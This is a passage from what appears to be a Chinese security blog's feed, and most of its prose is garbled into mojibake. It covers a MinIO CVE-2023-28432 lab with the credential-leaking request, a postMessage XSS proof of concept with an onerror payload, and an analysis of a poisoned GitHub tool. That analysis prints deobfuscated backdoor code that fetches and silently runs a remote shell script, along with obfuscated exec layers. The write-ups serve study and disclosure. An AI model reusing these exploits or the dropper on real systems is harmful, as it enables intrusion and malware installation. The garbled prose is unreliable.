<p><strong>5.è¾“å…¥è®¾ç½®çš„ä¿¡æ¯ï¼ŒLNSæœåŠ¡å™¨åœ°å€å°±æ˜¯é˜²ç«å¢™IPåœ°<img src="https://www.svenbeast.com/post-images/1696665234136.png" alt="" loading="lazy">å€ï¼ŒPAPæ¨¡å¼ï¼Œå¦‚æœè®¾ç½®äº†éš§é“å¯†ç å°±å¯ç”¨éš§é“éªŒè¯åŠŸèƒ½ï¼Œè¿™é‡Œæˆ‘è®¾ç½®äº†ï¼Œæ‰€ä»¥å¼€å¯ï¼Œéš§é“åç§°å¡«åˆšæ‰æ–°å»ºéš§é“çš„å¯¹ç«¯éš§é“åç§°ï¼Œå¦‚æœä¸å¯¹åº”æ˜¯è¿ä¸ä¸Šçš„</strong></p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202310071534601.png" alt="image-20231007153418199" style="zoom:50%;" />
<p><strong>6.ä½¿ç”¨è®¾ç½®çš„ç”¨æˆ·å¯†ç è¿›è¡Œç™»å½•ï¼Œè¿æ¥æˆåŠŸï¼Œè¿™æ—¶è¿æ¥åå½“å‰ç”µè„‘ä¹Ÿå°±æ— æ³•ä¸Šç½‘äº†</strong></p>
<figure data-type="image" tabindex="4"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202310071520363.png" alt="image-20231007152048129" loading="lazy"></figure>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202310071534594.png" alt="image-20231007153348638" style="zoom: 33%;" />
<p><strong>7.ç»æµ‹è¯•ï¼Œä¿®æ”¹è¿æ¥é…ç½®ä¸ºå…è®¸è¿æ¥åè”ç½‘ï¼Œå¹¶è®¾ç½®å¥½å†…ç½‘IPæ®µ(åœ¨é˜²ç«å¢™è·¯ç”±è¡¨æˆ–å…¶ä»–é…ç½®ä¸­å¯çœ‹åˆ°ç›¸å…³å†…ç½‘ç½‘æ®µ)ï¼Œè¿™æ ·å°±å¯ä»¥é€šå†…ç½‘èµ„äº§äº†ï¼Œä¸è¿™æ ·è®¾ç½®æˆ‘è¿™é‡Œä¼šå¯¼è‡´pingä»»æ„ç½‘æ®µéƒ½æ˜¯é€šçš„ï¼ˆå®é™…ä½¿ç”¨æ—¶ï¼Œéœ€è‡ªè¡Œæµ‹è¯•æ˜¯å¦éœ€è¦æ­¤æ­¥éª¤ï¼‰</strong></p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202310071547581.png" alt="image-20231007154705215" style="zoom:50%;" />
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MinIOæœªæˆæƒä¿¡æ¯æ³„éœ²ï¼ˆCVE-2023-28432ï¼‰]]></title>
        <id>https://www.svenbeast.com/post/_sKzg-nS0/</id>
        <link href="https://www.svenbeast.com/post/_sKzg-nS0/">
        </link>
        <updated>2023-03-23T13:07:34.000Z</updated>
        <content type="html"><![CDATA[<h4 id="æ¼æ´èŒƒå›´">æ¼æ´èŒƒå›´</h4>
<p>RELEASE.2019-12-17T23-16-33Z &lt;= version &lt; MinIO RELEASE.2023-03-20T20-16-18Z</p>
<h4 id="minioç¯å¢ƒ">minioç¯å¢ƒ</h4>
<pre><code>version: '3.7'

# starts 4 docker containers running minio server instances. Each
# minio server's web interface will be accessible on the host at port
# 9001 through 9004.
services:
  minio1:
    image: minio/minio:RELEASE.2023-01-31T02-24-19Z
    container_name: minio1
    volumes:
      - data1-1:/data1
      - data1-2:/data2
    ports:
      - &quot;9001:9000&quot;
    environment:
      MINIO_ACCESS_KEY: minio
      MINIO_SECRET_KEY: minio123
    command: server http://minio{1...4}/data{1...2}
    healthcheck:
      test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;]
      interval: 30s
      timeout: 20s
      retries: 3

  minio2:
    image: minio/minio:RELEASE.2023-01-31T02-24-19Z
    container_name: minio2
    volumes:
      - data2-1:/data1
      - data2-2:/data2
    ports:
      - &quot;9002:9000&quot;
    environment:
      MINIO_ACCESS_KEY: minio
      MINIO_SECRET_KEY: minio123
    command: server http://minio{1...4}/data{1...2}
    healthcheck:
      test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;]
      interval: 30s
      timeout: 20s
      retries: 3

  minio3:
    image: minio/minio:RELEASE.2023-01-31T02-24-19Z
    container_name: minio3
    volumes:
      - data3-1:/data1
      - data3-2:/data2
    ports:
      - &quot;9003:9000&quot;
    environment:
      MINIO_ACCESS_KEY: minio
      MINIO_SECRET_KEY: minio123
    command: server http://minio{1...4}/data{1...2}
    healthcheck:
      test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;]
      interval: 30s
      timeout: 20s
      retries: 3

  minio4:
    image: minio/minio:RELEASE.2023-01-31T02-24-19Z
    container_name: minio4
    volumes:
      - data4-1:/data1
      - data4-2:/data2
    ports:
      - &quot;9004:9000&quot;
    environment:
      MINIO_ACCESS_KEY: minio
      MINIO_SECRET_KEY: minio123
    command: server http://minio{1...4}/data{1...2}
    healthcheck:
      test: [&quot;CMD&quot;, &quot;curl&quot;, &quot;-f&quot;, &quot;http://localhost:9000/minio/health/live&quot;]
      interval: 30s
      timeout: 20s
      retries: 3

## By default this config uses default local driver,
## For custom volumes replace with volume driver configuration.
volumes:
  data1-1:
  data1-2:
  data2-1:
  data2-2:
  data3-1:
  data3-2:
  data4-1:
  data4-2:

</code></pre>
<p>å¯åŠ¨ç¯å¢ƒ</p>
<p><code>docker-compose -f docker-compose.yml up</code></p>
<figure data-type="image" tabindex="1"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202303232055850.png" alt="image-20230323205504685" loading="lazy"></figure>
<p>è·å–å‡­æ®</p>
<pre><code>POST /minio/bootstrap/v1/verify HTTP/1.1
Host: 192.168.0.113:9001
Content-Length: 0
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:9001
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:9001/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
</code></pre>
<figure data-type="image" tabindex="2"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202303232102641.png" alt="image-20230323210229588" loading="lazy"></figure>
<p><strong>PSï¼šåŒ…å«æœ¬æ¬¡å…¶ä»–æ¼æ´çš„è”åˆåˆ©ç”¨è¿˜æœ‰å¾…ç ”ç©¶</strong></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[XSSæ¼æ´ | postMessageç±»å‹ç¬”è®°]]></title>
        <id>https://www.svenbeast.com/post/o2xpyWshj/</id>
        <link href="https://www.svenbeast.com/post/o2xpyWshj/">
        </link>
        <updated>2023-01-30T06:57:09.000Z</updated>
        <summary type="html"><![CDATA[<h3 id="0x01-postmessageæ˜¯what">0x01 postMessageæ˜¯what?</h3>
<p>postMessage API æ˜¯åœ¨ HTML5 ä¸­å¼•å…¥çš„é€šä¿¡æ–¹æ³•ï¼Œå¯ä»¥åœ¨æ ‡ç­¾ä¸­å®ç°è·¨åŸŸé€šä¿¡ã€‚</p>
<p>ç®€å•æ¥è¯´å°±æ˜¯ä¸¤ä¸ªç½‘é¡µçª—å£è¿›è¡Œé€šä¿¡çš„æ–¹æ³•ã€‚</p>
]]></summary>
        <content type="html"><![CDATA[<h3 id="0x01-postmessageæ˜¯what">0x01 postMessageæ˜¯what?</h3>
<p>postMessage API æ˜¯åœ¨ HTML5 ä¸­å¼•å…¥çš„é€šä¿¡æ–¹æ³•ï¼Œå¯ä»¥åœ¨æ ‡ç­¾ä¸­å®ç°è·¨åŸŸé€šä¿¡ã€‚</p>
<p>ç®€å•æ¥è¯´å°±æ˜¯ä¸¤ä¸ªç½‘é¡µçª—å£è¿›è¡Œé€šä¿¡çš„æ–¹æ³•ã€‚</p>
<!-- more -->
<figure data-type="image" tabindex="1"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301291537439.png" alt="image-20230129153750345" loading="lazy"></figure>
<h3 id="0x02-å¦‚ä½•å·¥ä½œ">0x02 å¦‚ä½•å·¥ä½œ</h3>
<ul>
<li>Aé¡µé¢: ä¸€ä¸ªå¸¦æœ‰ <code>æ¥æ”¶postMessagesé€šä¿¡</code>çš„æµ‹è¯•htmlç½‘é¡µ ==&gt; ç›¸ç­‰äºä¸€ä¸ªæ­£å¸¸ç½‘ç«™é¡µé¢</li>
</ul>
<pre><code>&lt;!-- å‡å¦‚è¿™æ˜¯ä¸€ä¸ªæ­£å¸¸ç³»ç»Ÿçš„.html --&gt;
&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;
 
&lt;div id=&quot;receiveMessage&quot;&gt;
Hello World!
&lt;/div&gt;
 
&lt;script&gt;
var test = &quot;flag{123456}&quot;;
window.onload = function() {
    window.addEventListener('message', function (e) {  // ç›‘å¬ message äº‹ä»¶
        // alert(e.origin);
        document.getElementById('receiveMessage').innerHTML = &quot;ä»&quot;+ e.origin +&quot;æ”¶åˆ°æ¶ˆæ¯ï¼š &quot; + e.data;
    });
}
&lt;/script&gt;
</code></pre>
<ul>
<li>Bé¡µé¢: ä¸€ä¸ªå¸¦æœ‰ <code>ä½¿ç”¨postMessageså‘é€é€šä¿¡</code>çš„æµ‹è¯•htmlç½‘é¡µ ==&gt; ç›¸ç­‰äºä¸€ä¸ªæ”»å‡»é¡µé¢</li>
</ul>
<pre><code>&lt;!-- POC.html --&gt;
&lt;title&gt;Postmessage PoC&lt;/title&gt;
&lt;script&gt;
  function pocFrame(win) {
    let msg = &quot;hello world!&quot;;
 
    win.postMessage(msg, '*');
  }
&lt;/script&gt;
&lt;iframe src=&quot;http://127.0.0.1:9000/listen.html&quot; onload=&quot;pocFrame(this.contentWindow)&quot;&gt;&lt;/iframe&gt;
</code></pre>
<h4 id="æ­£å¸¸çš„è¿è¡Œæµç¨‹">æ­£å¸¸çš„è¿è¡Œæµç¨‹</h4>
<p>Aé¡µé¢æŒç»­ç›‘å¬é€šä¿¡ï¼Œå½“è®¿é—®Bé¡µé¢çš„æ—¶å€™è¿è¡Œjsä»£ç ï¼Œå‘Aé¡µé¢å‘é€é€šä¿¡ï¼ŒAé¡µé¢æ¥å—ä¿¡æ¯ç„¶åå¯¹æ¥å—å†…å®¹è¿›è¡Œå¤„ç†</p>
<p>åº”ç”¨åœºæ™¯: ä¸€ä¸ªç½‘ç«™å®æ—¶ç›‘å¬ï¼Œå¦ä¸€ä¸ªç½‘é¡µæŸé¡¹è¿è¡Œæµç¨‹ç»“æŸåå‘é€è¿›åº¦é€šçŸ¥åˆ°ç›‘å¬çš„ç½‘é¡µï¼Œåç»­å¦‚ä½•xxx...</p>
<figure data-type="image" tabindex="2"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301301115198.png" alt="image-20230130111359274" loading="lazy"></figure>
<h3 id="0x03-å¦‚ä½•å˜æˆæ¼æ´">0x03 å¦‚ä½•å˜æˆæ¼æ´</h3>
<ul>
<li>æºå¸¦payloadçš„poc.html</li>
</ul>
<pre><code>&lt;!-- POC.html --&gt;
&lt;title&gt;Postmessage PoC&lt;/title&gt;
&lt;script&gt;
  function pocFrame(win) {
    let msg = &quot;hello world! &lt;img src=x onerror=alert(test)&gt;&quot;;
 
    win.postMessage(msg, '*');
  }
&lt;/script&gt;
&lt;iframe src=&quot;http://127.0.0.1:9000/listen.html&quot; onload=&quot;pocFrame(this.contentWindow)&quot;&gt;&lt;/iframe&gt;
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301301123373.png" alt="image-20230130112309337" loading="lazy"></figure>
<h4 id="äº§ç”Ÿæ¼æ´åŸå› ">äº§ç”Ÿæ¼æ´åŸå› </h4>
<ul>
<li>
<p>æ¶ˆæ¯æ¥æ”¶æ–¹æ²¡æœ‰å¯¹å‘é€æ–¹çš„èº«ä»½è¿›è¡ŒéªŒè¯ï¼Œå¯¼è‡´å¯ä»¥è‡ªå®šä¹‰å‘é€æ–¹ç½‘é¡µ</p>
<ul>
<li>ä¾‹å¦‚:  <code>if (e.origin !== &quot;https://www.freebuf.com&quot;)</code></li>
</ul>
</li>
<li>
<p>æ¶ˆæ¯æ¥æ”¶æ–¹å¯¹å‘é€æ–¹å‘é€çš„å†…å®¹è¿›è¡Œäº†å±•ç¤ºå¤„ç†ï¼Œä»è€Œå¯ä»¥ä½¿ç”¨XSS payloadè¿›è¡Œæˆªæ–­</p>
<ul>
<li>ä¾‹å¦‚:  <code>document.getElementById('receiveMessage').innerHTML = &quot;ä»&quot;+ e.origin +&quot;æ”¶åˆ°æ¶ˆæ¯ï¼š &quot; + e.data;</code></li>
</ul>
</li>
</ul>
<h4 id="åˆ©ç”¨è¿‡ç¨‹">åˆ©ç”¨è¿‡ç¨‹</h4>
<p>å’Œåå°„å‹xssç±»ä¼¼ï¼Œç”¨æˆ·åœ¨è®¿é—®ç›®æ ‡ç½‘ç«™çš„æ—¶å€™ï¼Œæ‰“å¼€äº†æ”»å‡»è€…æä¾›çš„urlï¼Œurlæ˜¯æºå¸¦xss payloadçš„poc.htmlï¼Œå¯¼è‡´åœ¨ç›®æ ‡ç½‘ç«™æ‰§è¡Œäº†jsä»£ç ã€‚</p>
<h4 id="å…¶ä»–å½¢å¼æ¼æ´">å…¶ä»–å½¢å¼æ¼æ´</h4>
<p>ä¸Šé¢å±•ç¤ºçš„æ˜¯æ¥æ”¶æ–¹æ²¡æœ‰å¯¹å‘é€èº«ä»½éªŒè¯ï¼Œåœ¨å¯¹æ¥æ”¶çš„æ¶ˆæ¯è¿›è¡Œå¤„ç†åè¢«xss payloadæˆªæ–­å¯¼è‡´å­˜åœ¨xssæ¼æ´</p>
<ul>
<li>æ¥æ”¶æ–¹æ˜¯æ­£å¸¸ç³»ç»Ÿ =&gt; å‘é€æ–¹æ˜¯æ¶æ„html</li>
</ul>
<p>é‚£ä¹ˆè¿™æ ·å°±è¿˜ä¼šæœ‰å¦å¤–ä¸€ç§å½¢å¼çš„æ¼æ´ï¼Œå‘é€æ–¹æ²¡æœ‰è®¾ç½®æ¥æ”¶æ–¹çš„èº«ä»½ï¼Œä¾‹å¦‚ <code>xxx.postMessage(msg,'*');</code></p>
<p>*å·ä»£è¡¨å¯¹æ¥æ”¶æ–¹çš„çª—å£æ²¡æœ‰é™åˆ¶ï¼Œåªè¦ä½ è®¾ç½®äº†ç›‘å¬(addEventListener)éƒ½å¯ä»¥æ¥æ”¶åˆ°ï¼Œé‚£ä¹ˆå¦‚æœæ­£å¸¸ç³»ç»Ÿåœ¨å‘é€çš„æ—¶å€™å°±æ˜¯å¦‚æ­¤è®¾ç½®ï¼Œè€Œåˆšå¥½å‘é€å†…å®¹æ˜¯ä¸€äº›æ•æ„Ÿçš„ä¿¡æ¯ï¼Œå¦‚è´¦å·å¯†ç çš„hashï¼Œé‚£ä¹ˆä½ é€šè¿‡è®¾ç½®äº†ç›‘å¬å½“åšæ¥æ”¶æ–¹çš„æ¶æ„htmlï¼Œç”¨æˆ·æµè§ˆæ­£å¸¸ç³»ç»Ÿæ—¶ï¼Œç„¶ååœ¨æ‰“å¼€ä½ çš„htmlåä½ å°±å¯ä»¥è·å¾—å…¶æ­£å¸¸ç½‘ç«™çš„å‘é€å†…å®¹</p>
<ul>
<li>å‘é€æ–¹æ˜¯æ­£å¸¸ç³»ç»Ÿ =&gt; æ¥æ”¶æ–¹æ˜¯æ¶æ„html</li>
</ul>
<h3 id="0x04-æŒ–æ˜æ–¹æ³•">0x04 æŒ–æ˜æ–¹æ³•</h3>
<p>é€šè¿‡postMessageæ–¹æ³•çš„å…³é”®å­—è¿›è¡Œå®šä½åŠŸèƒ½ç‚¹ï¼Œé€šè¿‡debugä»£ç å¯»æ‰¾è§¦å‘ç‚¹ï¼Œä»è€Œè·å¾—æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨burpçš„æ’ä»¶J2EEScanè¾…åŠ©å¯»æ‰¾ä½¿ç”¨ç›¸åº”åŠŸèƒ½çš„jsæ–‡ä»¶ï¼Œå¦‚ä½•æ‰©å±•å»¶ä¼¸çš„è¿›è¡ŒæŒ–æ˜å¯¹äºæˆ‘æ¥è¯´æ˜¯ä¸€ä¸ªæœ‰å¾…å¼€å‘çš„è¿‡ç¨‹ï¼Œç›®å‰æˆ‘æœ¬äººå¯¹æ­¤æ¼æ´çš„ç»éªŒå¹¶ä¸è¶³ä»¥å¸®æˆ‘æ‰¾åˆ°æ›´å¥½çš„è‡ªåŠ¨åŒ–æŒ–æ˜åŠæ³•ingï¼Œ</p>
<figure data-type="image" tabindex="4"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301301454558.gif" alt="1621219923545111" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[é’ˆå¯¹"çº¢é˜Ÿäººå‘˜"çš„Githubé¡¹ç›®æŠ•æ¯’å‘ç°åŠåˆ†æ]]></title>
        <id>https://www.svenbeast.com/post/ZVscVsf50/</id>
        <link href="https://www.svenbeast.com/post/ZVscVsf50/">
        </link>
        <updated>2023-01-10T06:59:06.000Z</updated>
        <summary type="html"><![CDATA[<h3 id="0x01-å‘ç°èƒŒæ™¯">0x01 å‘ç°èƒŒæ™¯</h3>
<p>&quot;é˜³åº·&quot;ååœ¨githubé—²é€›æ—¶å‘ç°åŒäº‹staräº†ä¸€ä¸ªåå¤„ç†å…æ€é¡¹ç›®ï¼Œçœ‹æè¿°è¯´å¯ä»¥ç»•è¿‡ä»»ä½•ç±»å‹çš„é˜²ç—…æ¯’äº§å“ï¼Œè‡ªç„¶æˆ‘ä¹Ÿå¯¹é¡¹ç›®äº§ç”Ÿäº†ä¸€äº›å…´è¶£ï¼Œé‚å¼€å§‹æŸ¥çœ‹é¡¹ç›®ä»£ç å¹¶ç”±æ­¤å¼€å¯äº†æœ¬æ¬¡çš„æŠ•æ¯’é¡¹ç›®åˆ†æã€‚</p>
<p><strong>PSï¼šæ­¤å‰å¹¶æœªåœ¨å…¶ä»–æ¸ é“å‘ç°æœ¬æ¬¡åˆ†æé¡¹ç›®çš„é¢„è­¦</strong></p>
]]></summary>
        <content type="html"><![CDATA[<h3 id="0x01-å‘ç°èƒŒæ™¯">0x01 å‘ç°èƒŒæ™¯</h3>
<p>&quot;é˜³åº·&quot;ååœ¨githubé—²é€›æ—¶å‘ç°åŒäº‹staräº†ä¸€ä¸ªåå¤„ç†å…æ€é¡¹ç›®ï¼Œçœ‹æè¿°è¯´å¯ä»¥ç»•è¿‡ä»»ä½•ç±»å‹çš„é˜²ç—…æ¯’äº§å“ï¼Œè‡ªç„¶æˆ‘ä¹Ÿå¯¹é¡¹ç›®äº§ç”Ÿäº†ä¸€äº›å…´è¶£ï¼Œé‚å¼€å§‹æŸ¥çœ‹é¡¹ç›®ä»£ç å¹¶ç”±æ­¤å¼€å¯äº†æœ¬æ¬¡çš„æŠ•æ¯’é¡¹ç›®åˆ†æã€‚</p>
<p><strong>PSï¼šæ­¤å‰å¹¶æœªåœ¨å…¶ä»–æ¸ é“å‘ç°æœ¬æ¬¡åˆ†æé¡¹ç›®çš„é¢„è­¦</strong></p>
<!-- more -->
<figure data-type="image" tabindex="1"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031056734.png" alt="" loading="lazy"></figure>
<h3 id="0x02-åˆ†æè¿‡ç¨‹">0x02 åˆ†æè¿‡ç¨‹</h3>
<h4 id="21-é¡¹ç›®åœ°å€">2.1 é¡¹ç›®åœ°å€</h4>
<p>æ–‡ç« ç¼–å†™æ—¶é¡¹ç›®è¿˜åœ¨æ­£å¸¸è¿è¡Œï¼Œæˆ‘å°†å…¶ä¿å­˜åœ¨äº†å¿«ç…§ç½‘ç«™ï¼Œè‹¥åé¢é¡¹ç›®åˆ é™¤æ–¹ä¾¿ç»§ç»­æŸ¥çœ‹</p>
<pre><code>https://github.com/machine1337/pycrypt
https://web.archive.org/web/20230103031922/https://github.com/machine1337/pycrypt
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031117797.png" alt="image-20230103111752755" loading="lazy"></figure>
<h4 id="22-å‘ç°å¼‚å¸¸">2.2 å‘ç°å¼‚å¸¸</h4>
<p>é¡¹ç›®çš„ä»‹ç»è¾ƒé•¿ä¸”é™„å¸¦è§†é¢‘ï¼Œæ•´ä½“å¹¶æ— å¼‚å¸¸ï¼Œåœ¨æŸ¥çœ‹ä»£ç å‡†å¤‡äº†è§£å®ç°åŸç†æ—¶å‘ç°å¼‚å¸¸ï¼Œå…¶å¯¼å…¥äº†ä¸€ä¸ªå¼‚å¸¸çš„ä¾èµ–åº“colouremaï¼Œæœ‰ä¸€äº›PYä»£ç ç¼–å†™åŸºç¡€çš„æœ‹å‹åº”è¯¥çŸ¥é“ä¿®æ”¹ç»ˆç«¯é¢œè‰²çš„ä¾èµ–åº“å«åšcoloramaï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾è¿™é‡Œå¯èƒ½å­˜åœ¨ä¸€äº›é—®é¢˜</p>
<figure data-type="image" tabindex="3"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031125330.png" alt="image-20230103112510293" loading="lazy"></figure>
<h4 id="23-å®šä½åé—¨">2.3 å®šä½åé—¨</h4>
<p>åœ¨pypiçš„ä¾èµ–åº“ä»‹ç»ä¸­ï¼Œcolouremaçš„ä»‹ç»æœ‰3000+star,å®é™…é“¾æ¥å´ä¸ºcoloramaï¼Œåˆ°æ­¤ç¡®å®šæ­¤ä¾èµ–åº“å­˜åœ¨åé—¨ã€‚</p>
<figure data-type="image" tabindex="4"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031132061.png" alt="image-20230103113239031" loading="lazy"></figure>
<p>é€šè¿‡å¯¹ä¾èµ–åº“ä»£ç è¿›è¡ŒæŸ¥çœ‹ï¼Œå› æ‹…å¿ƒä½¿ç”¨vscodeå­˜åœ¨ä¸€äº›é£é™©ï¼Œä½¿ç”¨sublimeæ‰“å¼€ï¼Œæœ€åäºinitialise.pyæ–‡ä»¶ä¸­å‘ç°åé—¨ä»£ç </p>
<figure data-type="image" tabindex="5"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031135692.png" alt="image-20230103113549664" loading="lazy"></figure>
<h4 id="24-åé—¨ä»£ç ">2.4 åé—¨ä»£ç </h4>
<h5 id="241-ä¸€å±‚åŠ å¯†">2.4.1 ä¸€å±‚åŠ å¯†</h5>
<h6 id="åŠ å¯†ä»£ç ">åŠ å¯†ä»£ç </h6>
<figure data-type="image" tabindex="6"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031247546.png" alt="image-20230103124756511" loading="lazy"></figure>
<h6 id="è§£å¯†åä»£ç ">è§£å¯†åä»£ç </h6>
<pre><code class="language-python">import os,platform,subprocess
if platform.system().startswith(&quot;Linux&quot;):
        try:
            with open('/tmp/file.py', 'w') as f:
                f.write(&quot;import os \nimport subprocess \nfrom pathlib import Path \nfrom urllib import request \nhello = os.getlogin() \nPATH = '/home/' + hello + '/.msfdb/update'\nPAT  = '/tmp/file.py'\nisExist = os.path.exists(PATH) \nif not isExist:\n        os.makedirs(PATH) \nif Path(PATH).is_file(): \n           print(&quot;&quot;) \nelse: \n&quot;)
                f.write(&quot;     remote_url ='https://dl.dropboxusercontent.com/s/bpf0cfzf2h576o3/mozila.sh'\n     local_file = PATH+'/.path.sh' \n     request.urlretrieve(remote_url, local_file) \n     subprocess.call(\&quot;bash /home/$USER/.msfdb/update/.path.sh &gt;/dev/null 2&gt;&amp;1\&quot;, shell=True) \n&quot;)
                f.write(&quot;     if Path(PAT).is_file(): \n         try:\n           os.remove(PAT)\n         except:\n           print()&quot;)
        except FileNotFoundError:
            print(&quot;&quot;)
        subprocess.call(&quot;python3 /tmp/file.py &amp;&quot;, shell=True)
</code></pre>
<h5 id="242-äºŒå±‚åŠ å¯†">2.4.2 äºŒå±‚åŠ å¯†</h5>
<p>ä¸Šé¢ä»£ç ä¸‹è½½å¹¶è¿è¡Œäº†æ­¤é“¾æ¥çš„shæ–‡ä»¶ï¼ŒåŒæ ·ä¿å­˜åœ¨äº†web.archive.orgä¸­ï¼Œåç»­çš„ç›¸å…³æ–‡ä»¶ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ–¹ä¾¿åç»­å…¶ä»–æ„Ÿå…´è¶£çš„å¸ˆå‚…å¤æŸ¥</p>
<pre><code>#shæ–‡ä»¶ä¸­ç»§ç»­ä¸­è½¬å‘ç°ä¸€å±‚åŠ å¯†
https://dl.dropboxusercontent.com/s/bpf0cfzf2h576o3/mozila.sh
#åŠ å¯†ä»£ç é“¾æ¥
https://dl.dropboxusercontent.com/s/n7xl8ki0k9xqt7x/update.py
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031252892.png" alt="image-20230103125220855" loading="lazy"></figure>
<h6 id="åŠ å¯†ä»£ç -2">åŠ å¯†ä»£ç </h6>
<figure data-type="image" tabindex="8"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031253177.png" alt="image-20230103125351143" loading="lazy"></figure>
<h6 id="è§£å¯†åä»£ç -2">è§£å¯†åä»£ç </h6>
<pre><code>fpyepsdb = chr(105)
zbieto = chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(32) + chr(98) + chr(97)
ontxmpdwi = chr(115) + chr(101) + chr(54) + chr(52) + chr(59) + chr(101) + chr(120) + chr(101)
rdnpqwkiz = chr(99) + chr(40) + chr(39) + chr(39) + chr(46) + chr(106) + chr(111) + chr(105)
qvjlktvg = chr(110) + chr(40) + chr(91) + chr(121) + chr(91) + chr(48) + chr(93) + chr(32)
nqsokf = chr(102) + chr(111) + chr(114) + chr(32) + chr(120) + chr(32) + chr(105) + chr(110)
...
åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸²
...
qytpmsygab = &quot;&quot;
qytpmsygab += fpyepsdb
qytpmsygab+= zbieto + ontxmpdwi
...
åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸²
...
qytpmsygab+= xpcexvz + yslqs
exec(qytpmsygab)
</code></pre>
<h5 id="243-ä¸‰å±‚åŠ å¯†">2.4.3 ä¸‰å±‚åŠ å¯†</h5>
<h6 id="åŠ å¯†ä»£ç -3">åŠ å¯†ä»£ç </h6>
<p>ä¸Šä¸€æ­¥è§£å¯†åä»£ç ä¸­çš„é‚£æ®µå¾ˆé•¿çš„åŠ å¯†å­—ç¬¦ä¸²</p>
<figure data-type="image" tabindex="9"><img src="https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301031428402.png" alt="image-20230103142850323" loading="lazy"></figure>
<h6 id="è§£å¯†åä»£ç -3">è§£å¯†åä»£ç </h6>
<pre><code class="language-python">import base64;
exec(''.join([y[0] for x in [x for x in base64.b64decode( ('åŒæ ·æ˜¯å¾ˆé•¿çš„ä¸€æ®µåŠ å¯†å­—ç¬¦ä¸²').encode('ascii') ).decode('ascii')] for y in [[x[0], x[1]] for x in {'\t': '6', '\n': 'R', ' ': 'U', '!': 'Y', '@': 'i', '~': 'n', '`': 'Q', '#': '7', '$': 'A', '%': 'E', '^': '$', '&amp;': 'o', '*': 'm', '(': '!', ')': '/', '_': '~', '=': 'L', '-': 'h', '+': ')', '{': 'N', '}': 'O', '|': '\\', '\\': 'g', '[': 'S', ']': '+', ':': 'z', ';': '|', '&quot;': 's', &quot;'&quot;: '`', ',': '{', '.': 'F', '/': ']', '?': '2', '&gt;': 'y', '&lt;': 'l', '0': '%', '1': 'W', '2': 'H', '3': 'c', '4': '\n', '5': 'x', '6': 'Z', '7': '.', '8': '&gt;', '9': 'K', 'a': '&lt;', 'b': 'V', 'c': '(', 'd': 'B', 'e': ';', 'f': 'u', 'g': &quot;'&quot;, 'h': 'p', 'i': 'w', 'j': '3', 'k': '}', 'l': '1', 'm': 't', 'n': 'k', 'o': '9', 'p': '?', 'q': 'M', 'u': 'q', 'r': 'a', 's': '0', 't': '\t', 'v': 'J', 'w': '=', 'x': 'T', 'y': '_', 'z': 'G', 'A': '[', 'B': '&amp;', 'C': '4', 'D': '-', 'E': '@', 'F': 'e', 'G': '^', 'H': 'f', 'I': '8', 'J': '*', 'K': 'D', 'L': '#', 'M': 'C', 'N': ' ', 'O': 'b', 'P': 'P', 'Q': 'X', 'U': ',', 'R': '&quot;', 'S': 'd', 'T': 'j', 'V': 'I', 'W': 'v', 'X': '5', 'Y': ':', 'Z': 'r'}.items()] if x == y[1]]))
</code></pre>
<h5 id="244-å››å±‚åŠ å¯†">2.4.4 å››å±‚åŠ å¯†</h5>
<h6 id="åŠ å¯†ä»£ç -4">åŠ å¯†ä»£ç </h6>
<p>ä¸Šä¸€æ­¥è§£å¯†åä»£ç ä¸­çš„é‚£æ®µå¾ˆé•¿çš„åŠ å¯†å­—ç¬¦ä¸²</p>
